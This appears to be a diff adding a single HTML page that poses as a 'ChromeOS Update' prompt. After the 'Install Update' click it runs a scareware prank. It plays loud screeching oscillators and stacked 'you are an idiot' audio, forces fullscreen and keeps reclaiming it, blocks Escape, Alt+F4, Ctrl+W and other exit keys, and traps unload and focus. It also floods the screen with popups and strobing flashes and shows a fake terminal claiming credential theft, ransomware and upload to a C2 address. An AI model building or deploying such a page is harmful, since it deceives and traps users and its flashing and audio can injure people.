@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>System Update</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    background: #000;
+    overflow: hidden;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    user-select: none;
+    -webkit-user-select: none;
+    width: 100%;
+    height: 100%;
+  }
+
+  .landing {
+    position: fixed;
+    inset: 0;
+    background: linear-gradient(135deg, #0d1117 0%, #161b22 50%, #0d1117 100%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 100000;
+    transition: opacity 0.4s;
+  }
+  .landing img {
+    width: 300px;
+    max-width: 60vw;
+    height: auto;
+    border-radius: 16px;
+    filter: drop-shadow(0 0 40px rgba(66, 165, 245, 0.3));
+    margin-bottom: 32px;
+  }
+  .landing h1 {
+    color: #58a6ff;
+    font-size: 22px;
+    font-weight: 600;
+    margin-bottom: 8px;
+    letter-spacing: 0.5px;
+  }
+  .landing p {
+    color: #8b949e;
+    font-size: 13px;
+    margin-bottom: 28px;
+    text-align: center;
+    max-width: 340px;
+    line-height: 1.5;
+  }
+  .activate-btn {
+    padding: 14px 48px;
+    font-size: 16px;
+    font-weight: 700;
+    color: #fff;
+    background: linear-gradient(135deg, #1f6feb, #388bfd);
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    box-shadow: 0 0 30px rgba(56, 139, 253, 0.4), inset 0 1px 0 rgba(255,255,255,0.15);
+    transition: transform 0.15s, box-shadow 0.15s;
+    position: relative;
+    overflow: hidden;
+  }
+  .activate-btn:hover {
+    transform: translateY(-2px) scale(1.03);
+    box-shadow: 0 0 50px rgba(56, 139, 253, 0.6), inset 0 1px 0 rgba(255,255,255,0.2);
+  }
+  .activate-btn:active { transform: translateY(0) scale(0.98); }
+  .activate-btn::before {
+    content: '';
+    position: absolute;
+    inset: -4px;
+    border-radius: 10px;
+    border: 2px solid rgba(56, 139, 253, 0.4);
+    animation: pulseRing 2s ease-in-out infinite;
+  }
+  @keyframes pulseRing {
+    0%, 100% { opacity: 0.4; transform: scale(1); }
+    50% { opacity: 1; transform: scale(1.05); }
+  }
+
+  .loader-stage {
+    position: fixed;
+    inset: 0;
+    background: #2d2d2d;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    z-index: 90000;
+    opacity: 0;
+    transition: opacity 0.3s;
+  }
+  .loader-stage img {
+    width: 520px;
+    max-width: 70vw;
+    height: auto;
+    filter: drop-shadow(0 0 30px rgba(66, 165, 245, 0.4));
+    animation: breathe 1.4s ease-in-out infinite;
+  }
+  @keyframes breathe {
+    0%, 100% { transform: scale(1); filter: drop-shadow(0 0 30px rgba(66,165,245,0.4)) brightness(1); }
+    50%      { transform: scale(1.04); filter: drop-shadow(0 0 55px rgba(66,165,245,0.75)) brightness(1.2); }
+  }
+  .spinner {
+    margin-top: 28px;
+    width: 44px; height: 44px;
+    border: 4px solid rgba(255,255,255,0.12);
+    border-top-color: #42a5f5;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loader-text {
+    margin-top: 18px;
+    color: #ccc;
+    font-size: 14px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .glitch-layer {
+    position: fixed;
+    inset: 0;
+    z-index: 9000;
+    pointer-events: none;
+    mix-blend-mode: screen;
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+
+  .popup-window {
+    position: fixed;
+    z-index: 5000;
+    background: #1a1a1a;
+    border: 1px solid #444;
+    box-shadow: 0 0 24px rgba(255,255,255,0.12);
+    animation: popupIn 0.2s cubic-bezier(.2,1.6,.4,1);
+    overflow: hidden;
+  }
+  @keyframes popupIn {
+    from { transform: scale(0.1) rotate(-18deg); opacity: 0; }
+    to   { transform: scale(1) rotate(0deg); opacity: 1; }
+  }
+  .popup-window img { display: block; width: 100%; height: auto; }
+  .popup-window .titlebar {
+    background: #2d2d2d;
+    color: #ddd;
+    font-size: 11px;
+    padding: 4px 8px;
+    display: flex;
+    justify-content: space-between;
+    border-bottom: 1px solid #404040;
+    font-family: monospace;
+  }
+
+  .flash {
+    position: fixed;
+    inset: 0;
+    background: white;
+    z-index: 9500;
+    opacity: 0;
+    pointer-events: none;
+    mix-blend-mode: difference;
+  }
+
+  body.shake { animation: bodyShake 0.03s infinite alternate; }
+  @keyframes bodyShake {
+    from { transform: translate(-3px, 2px) skew(0.5deg, 0); }
+    to   { transform: translate(4px, -3px) skew(-0.5deg, 0); }
+  }
+
+  .lag-box {
+    position: fixed;
+    pointer-events: none;
+    z-index: 2000;
+    opacity: 0.6;
+    border-radius: 2px;
+  }
+
+  .terminal {
+    position: fixed;
+    bottom: 0; left: 0;
+    width: 100%;
+    height: 140px;
+    background: rgba(0,0,0,0.88);
+    color: #0f0;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+    padding: 8px 12px;
+    z-index: 8000;
+    overflow: hidden;
+    border-top: 1px solid #0f0;
+    box-shadow: 0 -4px 20px rgba(0,255,0,0.15);
+    display: none;
+  }
+
+  .fs-kill {
+    position: fixed;
+    inset: 0;
+    z-index: 100000;
+    display: none;
+    background: transparent;
+  }
+
+  body.chaos-mode { cursor: none; }
+</style>
+</head>
+<body>
+
+<div class="landing" id="landing">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-fM1Ud3k482_IDKDmUDliWUuDLBkw91y9Bm3WYB9TVw&s=10" alt="icon">
+  <h1>ChromeOS Update</h1>
+  <p>Your device requires a critical security update. Press the button below to begin installation.</p>
+  <button class="activate-btn" id="activateBtn">Install Update</button>
+</div>
+
+<div class="loader-stage" id="loaderStage" style="display:none">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-fM1Ud3k482_IDKDmUDliWUuDLBkw91y9Bm3WYB9TVw&s=10" alt="">
+  <div class="spinner"></div>
+  <div class="loader-text">Installing System Update...</div>
+</div>
+
+<canvas class="glitch-layer" id="glitchCanvas"></canvas>
+<div class="flash" id="flash"></div>
+<div class="terminal" id="terminal"></div>
+<div class="fs-kill" id="fsKill"></div>
+
+<script>
+(function() {
+  'use strict';
+
+  var IMG_URL = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-fM1Ud3k482_IDKDmUDliWUuDLBkw91y9Bm3WYB9TVw&s=10';
+  var AUDIO_MP3 = 'https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3';
+
+  var landing = document.getElementById('landing');
+  var loaderStage = document.getElementById('loaderStage');
+  var glitchCanvas = document.getElementById('glitchCanvas');
+  var flash = document.getElementById('flash');
+  var terminal = document.getElementById('terminal');
+  var fsKill = document.getElementById('fsKill');
+  var ctx = glitchCanvas.getContext('2d');
+  var btn = document.getElementById('activateBtn');
+
+  var active = false;
+
+  glitchCanvas.width = window.innerWidth;
+  glitchCanvas.height = window.innerHeight;
+
+  window.addEventListener('resize', function() {
+    glitchCanvas.width = window.innerWidth;
+    glitchCanvas.height = window.innerHeight;
+  });
+
+  // ===========================================
+  // AUDIO — "YOU ARE AN IDIOT" spam (the version that worked)
+  // ===========================================
+  var audioCtx = null;
+  var masterGain = null;
+  var allGains = [];
+  var allOscs = [];
+  var noiseGain = null;
+  var idiotAudios = [];
+
+  function startIdiotAudio() {
+    // Spawn multiple Audio elements for overlapping echo — same method that worked before
+    for (var i = 0; i < 12; i++) {
+      (function(idx) {
+        setTimeout(function() {
+          var a = new Audio(AUDIO_MP3);
+          a.volume = 1.0;
+          a.loop = true;
+          a.playbackRate = 0.8 + (idx * 0.04); // slightly different speeds for echo chaos
+          a.play().then(function() {
+            // Playing successfully
+          }).catch(function(e) {
+            // If autoplay fails, try again on next user interaction
+            console.log('audio play failed, will retry');
+          });
+          idiotAudios.push(a);
+        }, idx * 250);
+      })(i);
+    }
+
+    // Keep spawning more every 4 seconds for layering
+    setInterval(function() {
+      if (!active) return;
+      var a = new Audio(AUDIO_MP3);
+      a.volume = 1.0;
+      a.loop = true;
+      a.playbackRate = 0.8 + Math.random() * 0.4;
+      a.play().catch(function(e) {});
+      idiotAudios.push(a);
+
+      // Cap at 18 audio elements
+      if (idiotAudios.length > 18) {
+        var old = idiotAudios.shift();
+        if (old) { old.pause(); old.src = ''; }
+      }
+    }, 4000);
+  }
+
+  // ===========================================
+  // SCREECH AUDIO — ringing oscillators
+  // ===========================================
+  function startAudio() {
+    try {
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+      var comp = audioCtx.createDynamicsCompressor();
+      comp.threshold.value = -60;
+      comp.knee.value = 0;
+      comp.ratio.value = 20;
+      comp.attack.value = 0;
+      comp.release.value = 0.05;
+      comp.connect(audioCtx.destination);
+
+      masterGain = audioCtx.createGain();
+      masterGain.gain.value = 1.0;
+      masterGain.connect(comp);
+
+      var oscConfigs = [
+        { type: 'square',   freq: 3000,  gain: 0.30 },
+        { type: 'square',   freq: 3100,  gain: 0.30 },
+        { type: 'sawtooth', freq: 4000,  gain: 0.28 },
+        { type: 'sawtooth', freq: 4200,  gain: 0.28 },
+        { type: 'square',   freq: 5000,  gain: 0.25 },
+        { type: 'square',   freq: 5500,  gain: 0.25 },
+        { type: 'sawtooth', freq: 6500,  gain: 0.22 },
+        { type: 'sine',     freq: 8000,  gain: 0.22 },
+        { type: 'sine',     freq: 9000,  gain: 0.20 },
+        { type: 'square',   freq: 55,    gain: 0.40 }
+      ];
+
+      allGains = [];
+      allOscs = [];
+
+      for (var i = 0; i < oscConfigs.length; i++) {
+        var cfg = oscConfigs[i];
+        var osc = audioCtx.createOscillator();
+        osc.type = cfg.type;
+        osc.frequency.value = cfg.freq;
+
+        var g = audioCtx.createGain();
+        g.gain.value = cfg.gain;
+
+        osc.connect(g);
+        g.connect(masterGain);
+        osc.start();
+
+        allOscs.push(osc);
+        allGains.push({ gain: g, base: cfg.gain, freq: cfg.freq });
+      }
+
+      var lfoConfigs = [
+        { type: 'sawtooth', freq: 9,  depth: 500,  targets: [0, 1] },
+        { type: 'square',   freq: 13, depth: 700,  targets: [2, 3] },
+        { type: 'sawtooth', freq: 7,  depth: 1200, targets: [4, 5] },
+        { type: 'square',   freq: 11, depth: 900,  targets: [6, 7] },
+        { type: 'sawtooth', freq: 17, depth: 1500, targets: [8] }
+      ];
+
+      for (var i = 0; i < lfoConfigs.length; i++) {
+        var lcfg = lfoConfigs[i];
+        var lfo = audioCtx.createOscillator();
+        lfo.type = lcfg.type;
+        lfo.frequency.value = lcfg.freq;
+        var lg = audioCtx.createGain();
+        lg.gain.value = lcfg.depth;
+        lfo.connect(lg);
+        for (var j = 0; j < lcfg.targets.length; j++) {
+          lg.connect(allOscs[lcfg.targets[j]].frequency);
+        }
+        lfo.start();
+      }
+
+      var noiseSize = audioCtx.sampleRate * 2;
+      var noiseBuf = audioCtx.createBuffer(1, noiseSize, audioCtx.sampleRate);
+      var noiseData = noiseBuf.getChannelData(0);
+      for (var i = 0; i < noiseSize; i++) {
+        noiseData[i] = (Math.random() * 2 - 1) * 0.9;
+      }
+
+      var noiseSrc = audioCtx.createBufferSource();
+      noiseSrc.buffer = noiseBuf;
+      noiseSrc.loop = true;
+
+      noiseGain = audioCtx.createGain();
+      noiseGain.gain.value = 0.30;
+
+      var noiseFilter = audioCtx.createBiquadFilter();
+      noiseFilter.type = 'bandpass';
+      noiseFilter.frequency.value = 6000;
+      noiseFilter.Q.value = 0.7;
+
+      noiseSrc.connect(noiseFilter);
+      noiseFilter.connect(noiseGain);
+      noiseGain.connect(masterGain);
+      noiseSrc.start();
+
+      setInterval(function() {
+        if (!audioCtx) return;
+        var t = audioCtx.currentTime;
+        for (var i = 0; i < allGains.length; i++) {
+          var ag = allGains[i];
+          var spike = Math.random() < 0.45;
+          var target = spike ? ag.base * 2.0 : ag.base * 0.4;
+          ag.gain.gain.setValueAtTime(ag.gain.gain.value, t);
+          ag.gain.gain.linearRampToValueAtTime(target, t + 0.015);
+          ag.gain.gain.linearRampToValueAtTime(ag.base, t + 0.08);
+        }
+      }, 100);
+
+      setInterval(function() {
+        if (!audioCtx) return;
+        var t = audioCtx.currentTime;
+        noiseGain.gain.setValueAtTime(noiseGain.gain.value, t);
+        noiseGain.gain.linearRampToValueAtTime(0.6, t + 0.02);
+        noiseGain.gain.linearRampToValueAtTime(0.30, t + 0.08);
+      }, 220);
+
+      setInterval(function() {
+        if (!audioCtx) return;
+        var idx = Math.floor(Math.random() * allOscs.length);
+        var baseFreq = allGains[idx].freq;
+        var newFreq = baseFreq + (Math.random() - 0.5) * 3000;
+        allOscs[idx].frequency.linearRampToValueAtTime(newFreq, audioCtx.currentTime + 0.04);
+      }, 60);
+
+      setInterval(function() {
+        if (!audioCtx) return;
+        var idx = Math.floor(Math.random() * allOscs.length);
+        var types = ['square', 'sawtooth', 'triangle'];
+        allOscs[idx].type = types[Math.floor(Math.random() * types.length)];
+      }, 180);
+
+      setInterval(function() {
+        if (!audioCtx) return;
+        var t = audioCtx.currentTime;
+        var slam = Math.random() < 0.3;
+        if (slam) {
+          masterGain.gain.setValueAtTime(masterGain.gain.value, t);
+          masterGain.gain.linearRampToValueAtTime(0.3, t + 0.01);
+          masterGain.gain.linearRampToValueAtTime(1.0, t + 0.05);
+        }
+      }, 400);
+
+    } catch(e) {
+      console.log('audio error: ' + e.message);
+    }
+  }
+
+  // ===========================================
+  // FULLSCREEN
+  // ===========================================
+  function enterFullscreen() {
+    var el = document.documentElement;
+    try {
+      if (el.requestFullscreen) el.requestFullscreen();
+      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      else if (el.webkitRequestFullScreen) el.webkitRequestFullScreen();
+      else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
+      else if (el.msRequestFullscreen) el.msRequestFullscreen();
+    } catch(e) {}
+  }
+
+  function isFullscreen() {
+    return !!(document.fullscreenElement || document.webkitFullscreenElement ||
+              document.mozFullScreenElement || document.msFullscreenElement);
+  }
+
+  function lockFullscreen() {
+    enterFullscreen();
+    setInterval(function() {
+      if (!isFullscreen() && active) {
+        enterFullscreen();
+        setTimeout(enterFullscreen, 100);
+        for (var i = 0; i < 5; i++) spawnPopup();
+      }
+    }, 500);
+    document.addEventListener('fullscreenchange', handleFsChange);
+    document.addEventListener('webkitfullscreenchange', handleFsChange);
+    document.addEventListener('mozfullscreenchange', handleFsChange);
+    document.addEventListener('MSFullscreenChange', handleFsChange);
+  }
+
+  function handleFsChange() {
+    if (!isFullscreen() && active) {
+      enterFullscreen();
+      for (var i = 0; i < 8; i++) spawnPopup();
+      flash.style.opacity = '0.8';
+      setTimeout(function() { flash.style.opacity = '0'; }, 80);
+    }
+  }
+
+  // ===========================================
+  // KEY BLOCKING
+  // ===========================================
+  function blockKeys(e) {
+    if (!active) return;
+    var k = e.key;
+    var blocked = k === 'Escape' || k === 'F11' || k === 'F5' ||
+      k === 'F4' || k === 'Alt' || k === 'Tab' ||
+      (e.ctrlKey && (k === 'w' || k === 't' || k === 'n' || k === 'r' ||
+                      k === 'Shift' || k === 'q' || k === 'l' || k === 'h')) ||
+      (e.altKey && (k === 'Tab' || k === 'F4' || k === 'Escape')) ||
+      (e.metaKey && k === 'Escape');
+    if (blocked) {
+      e.preventDefault();
+      e.stopPropagation();
+      try { e.returnValue = false; } catch(err) {}
+      for (var i = 0; i < 3; i++) spawnPopup();
+      return false;
+    }
+  }
+  window.addEventListener('keydown', blockKeys, true);
+  window.addEventListener('keyup', blockKeys, true);
+  window.addEventListener('keypress', blockKeys, true);
+  document.addEventListener('contextmenu', function(e) { if (active) e.preventDefault(); });
+
+  window.addEventListener('beforeunload', function(e) {
+    if (!active) return;
+    e.preventDefault();
+    e.returnValue = '';
+    return '';
+  });
+
+  window.addEventListener('blur', function() {
+    if (!active) return;
+    setTimeout(function() { window.focus(); }, 10);
+    setTimeout(function() { window.focus(); }, 50);
+  });
+
+  // ===========================================
+  // POPUPS
+  // ===========================================
+  var popupCount = 0;
+  var MAX_POPUPS = 200;
+
+  function spawnPopup() {
+    if (popupCount >= MAX_POPUPS) return;
+    popupCount++;
+    var w = 160 + Math.random() * 320;
+    var x = Math.random() * (window.innerWidth - w);
+    var y = Math.random() * (window.innerHeight - w * 0.7);
+    var pop = document.createElement('div');
+    pop.className = 'popup-window';
+    pop.style.width = w + 'px';
+    pop.style.left = x + 'px';
+    pop.style.top = y + 'px';
+    pop.style.transform = 'rotate(' + (Math.random() * 30 - 15).toFixed(1) + 'deg)';
+    var titlebar = document.createElement('div');
+    titlebar.className = 'titlebar';
+    var alerts = ['system_alert', 'critical_error', 'virus_detected', 'data_breach', 'infection_' + popupCount, 'WARNING', 'FATAL', 'BREACH', 'CORRUPTED'];
+    var alertText = alerts[Math.floor(Math.random() * alerts.length)];
+    titlebar.innerHTML = '<span>&#9888; ' + alertText + '</span><span>X</span>';
+    var img = document.createElement('img');
+    img.src = IMG_URL;
+    pop.appendChild(titlebar);
+    pop.appendChild(img);
+    document.body.appendChild(pop);
+    if (Math.random() < 0.65) {
+      var vx = (Math.random() - 0.5) * 4;
+      var vy = (Math.random() - 0.5) * 4;
+      var cx = x, cy = y;
+      var move = setInterval(function() {
+        cx += vx; cy += vy;
+        if (cx < -w) cx = window.innerWidth;
+        if (cy < -w * 0.7) cy = window.innerHeight;
+        if (cx > window.innerWidth) cx = -w;
+        if (cy > window.innerHeight) cy = -w * 0.7;
+        pop.style.left = cx + 'px';
+        pop.style.top = cy + 'px';
+      }, 20);
+      setTimeout(function() { clearInterval(move); }, 6000);
+    }
+    pop.addEventListener('click', function() {
+      for (var i = 0; i < 5; i++) spawnPopup();
+    });
+    if (popupCount % 50 === 0) {
+      var all = document.querySelectorAll('.popup-window');
+      if (all.length > 60) {
+        for (var i = 0; i < 15; i++) { if (all[i]) all[i].remove(); }
+      }
+    }
+  }
+
+  // ===========================================
+  // LAG SPAM
+  // ===========================================
+  function spawnLagBox() {
+    var box = document.createElement('div');
+    box.className = 'lag-box';
+    var size = 50 + Math.random() * 250;
+    box.style.width = size + 'px';
+    box.style.height = size + 'px';
+    box.style.left = Math.random() * window.innerWidth + 'px';
+    box.style.top = Math.random() * window.innerHeight + 'px';
+    box.style.background = 'hsla(' + (Math.random() * 360) + ', 85%, 50%, 0.5)';
+    box.style.boxShadow = '0 0 ' + (size * 0.5) + 'px hsla(' + (Math.random() * 360) + ', 85%, 50%, 0.6)';
+    box.style.animation = 'spin ' + (0.2 + Math.random() * 0.4) + 's linear infinite';
+    box.style.filter = 'blur(' + (Math.random() * 5) + 'px) hue-rotate(' + (Math.random() * 360) + 'deg)';
+    document.body.appendChild(box);
+    var lagBoxes = document.querySelectorAll('.lag-box');
+    if (lagBoxes.length > 80) { lagBoxes[0].remove(); }
+  }
+
+  // ===========================================
+  // GLITCH CANVAS
+  // ===========================================
+  var hue = 0;
+
+  function drawGlitch() {
+    if (!active) return;
+    hue = (hue + 8) % 360;
+    var w = glitchCanvas.width;
+    var h = glitchCanvas.height;
+    var grad = ctx.createLinearGradient(0, 0, w, h);
+    grad.addColorStop(0, 'hsla(' + hue + ', 100%, 55%, 0.25)');
+    grad.addColorStop(0.25, 'hsla(' + ((hue + 90) % 360) + ', 100%, 55%, 0.25)');
+    grad.addColorStop(0.5, 'hsla(' + ((hue + 180) % 360) + ', 100%, 55%, 0.25)');
+    grad.addColorStop(0.75, 'hsla(' + ((hue + 270) % 360) + ', 100%, 55%, 0.25)');
+    grad.addColorStop(1, 'hsla(' + hue + ', 100%, 55%, 0.25)');
+    ctx.fillStyle = grad;
+    ctx.fillRect(0, 0, w, h);
+    var bars = 8 + Math.floor(Math.random() * 16);
+    for (var i = 0; i < bars; i++) {
+      var by = Math.random() * h;
+      var bh = 2 + Math.random() * 80;
+      var bx = Math.random() * w * 0.4 - 40;
+      var bw = w * (0.3 + Math.random() * 0.9);
+      ctx.fillStyle = 'hsla(' + (Math.random() * 360) + ', 95%, 60%, 0.5)';
+      ctx.fillRect(bx, by, bw, bh);
+    }
+    if (Math.random() < 0.4) {
+      var sy = Math.random() * h;
+      var sh = 20 + Math.random() * 120;
+      ctx.globalCompositeOperation = 'screen';
+      ctx.fillStyle = 'rgba(255,0,80,0.12)';
+      ctx.fillRect(0, sy, w, sh);
+      ctx.fillStyle = 'rgba(0,255,200,0.12)';
+      ctx.fillRect(-25, sy, w, sh);
+      ctx.fillStyle = 'rgba(100,100,255,0.1)';
+      ctx.fillRect(25, sy, w, sh);
+      ctx.globalCompositeOperation = 'source-over';
+    }
+    if (Math.random() < 0.6) {
+      ctx.fillStyle = 'hsla(' + (Math.random() * 360) + ', 95%, 60%, 0.35)';
+      for (var i = 0; i < 300; i++) {
+        ctx.fillRect(Math.random() * w, Math.random() * h, Math.random() * 5 + 1, Math.random() * 5 + 1);
+      }
+    }
+    ctx.fillStyle = 'rgba(0,0,0,0.08)';
+    for (var y = 0; y < h; y += 4) { ctx.fillRect(0, y, w, 2); }
+    if (Math.random() < 0.06) {
+      flash.style.opacity = String(0.3 + Math.random() * 0.5);
+      setTimeout(function() { flash.style.opacity = '0'; }, 30 + Math.random() * 70);
+    }
+    requestAnimationFrame(drawGlitch);
+  }
+
+  // ===========================================
+  // FAKE TERMINAL
+  // ===========================================
+  var termLines = [
+    '> initializing payload...',
+    '> bypassing security protocols... OK',
+    '> injecting kernel module... OK',
+    '> disabling firewall... OK',
+    '> encrypting user data... [##########] 100%',
+    '> fetching device credentials... OK',
+    '> uploading to C2 server 185.220.101.34... OK',
+    '> installing persistent backdoor... OK',
+    '> disabling recovery mode... OK',
+    '> wiping local partitions... [##########] 100%',
+    '> TRUST ME. THIS IS FINE.',
+    '> deploying ransomware payload... OK',
+    '> SYSTEM COMPROMISED.',
+    '> all your base are belong to us',
+    '> have a nice day (:'
+  ];
+  var termIdx = 0;
+
+  function writeTerminal() {
+    if (termIdx >= termLines.length) { terminal.innerHTML = ''; termIdx = 0; }
+    var line = document.createElement('div');
+    line.textContent = termLines[termIdx];
+    line.style.opacity = '0';
+    line.style.transition = 'opacity 0.1s';
+    terminal.appendChild(line);
+    setTimeout(function() { line.style.opacity = '1'; }, 10);
+    while (terminal.children.length > 7) { terminal.removeChild(terminal.firstChild); }
+    termIdx++;
+  }
+
+  // ===========================================
+  // EXTRA CHAOS
+  // ===========================================
+  function startExtraChaos() {
+    setInterval(function() {
+      var titles = ['WARNING', 'SYSTEM ERROR', 'VIRUS', 'HELP', 'CRITICAL', '???', 'INFECTED', 'GG', 'RIP'];
+      document.title = titles[Math.floor(Math.random() * titles.length)];
+    }, 250);
+    setInterval(function() {
+      var fakeCursor = document.createElement('div');
+      fakeCursor.style.position = 'fixed';
+      fakeCursor.style.left = (Math.random() * window.innerWidth) + 'px';
+      fakeCursor.style.top = (Math.random() * window.innerHeight) + 'px';
+      fakeCursor.style.width = '20px';
+      fakeCursor.style.height = '20px';
+      fakeCursor.style.zIndex = '9500';
+      fakeCursor.style.pointerEvents = 'none';
+      fakeCursor.style.mixBlendMode = 'difference';
+      fakeCursor.style.fontSize = '20px';
+      fakeCursor.style.color = 'hsl(' + (Math.random() * 360) + ',100%,60%)';
+      fakeCursor.innerHTML = '&#10148;';
+      document.body.appendChild(fakeCursor);
+      setTimeout(function() { fakeCursor.remove(); }, 300);
+    }, 100);
+    setInterval(function() {
+      document.body.style.transform = 'skew(' + (Math.random() * 4 - 2).toFixed(1) + 'deg, ' + (Math.random() * 2 - 1).toFixed(1) + 'deg)';
+      setTimeout(function() { document.body.style.transform = ''; }, 50);
+    }, 400);
+    setInterval(function() {
+      try {
+        window.resizeTo(window.screen.availWidth, window.screen.availHeight);
+        window.moveTo(0, 0);
+      } catch(e) {}
+    }, 1000);
+  }
+
+  // ===========================================
+  // BOOT CHAOS
+  // ===========================================
+  function startChaos() {
+    active = true;
+    document.body.classList.add('chaos-mode');
+    landing.style.opacity = '0';
+    setTimeout(function() { landing.style.display = 'none'; }, 400);
+    loaderStage.style.display = 'flex';
+    loaderStage.style.opacity = '1';
+    fsKill.style.display = 'block';
+
+    setTimeout(function() {
+      loaderStage.style.opacity = '0';
+      setTimeout(function() { loaderStage.style.display = 'none'; }, 300);
+      glitchCanvas.style.opacity = '1';
+      document.body.classList.add('shake');
+      terminal.style.display = 'block';
+
+      // --- FIRE "YOU ARE AN IDIOT" AUDIO ---
+      startIdiotAudio();
+
+      // --- FIRE SCREECH AUDIO ---
+      startAudio();
+
+      lockFullscreen();
+      drawGlitch();
+      for (var i = 0; i < 15; i++) { setTimeout(spawnPopup, i * 80); }
+      setInterval(spawnPopup, 500);
+      setInterval(spawnLagBox, 60);
+      setInterval(writeTerminal, 600);
+      startExtraChaos();
+    }, 2200);
+  }
+
+  // ===========================================
+  // ACTIVATE BUTTON
+  // ===========================================
+  btn.onclick = function() {
+    // Resume audio context if suspended
+    if (audioCtx && audioCtx.state === 'suspended') {
+      audioCtx.resume();
+    }
+
+    // Pre-create audio context for screech within user gesture
+    try {
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
+      }
+    } catch(e) {}
+
+    startChaos();
+    return false;
+  };
+
+})();
+</script>
+</body>
+</html>
